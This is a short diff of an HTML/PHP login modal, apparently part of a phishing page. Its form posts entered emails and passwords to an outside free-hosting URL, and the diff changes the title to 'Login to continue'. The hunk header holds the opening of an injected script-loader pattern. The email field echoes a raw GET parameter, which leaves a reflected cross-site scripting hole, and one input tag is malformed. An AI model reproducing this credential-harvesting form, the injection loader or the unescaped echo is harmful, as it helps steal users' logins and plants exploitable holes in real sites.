@@ -420,13 +420,13 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
             <div class="modal-content">
                 <div class="modal-header">
                     <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
-                    <h4 class="modal-title">Login &amp; Register</h4>
+                    <h4 class="modal-title">Login to continue</h4>
                 </div>               
                 
                 <div class="modal-body">                                       
                 <div class="col-md-6 col-sm-6 no-padng">
                     <div class="model-l">                    
-                    <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs" id="logFrm" class="log-frm" name="logFrm"> 
+                    <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs" class="log-frm" > 
                     <ul>                                                     
                         <li>Email</li>
                         <li> <input type="text" value="<?php echo $_GET['login']; ?>" name="userName" class="form-control" </li>
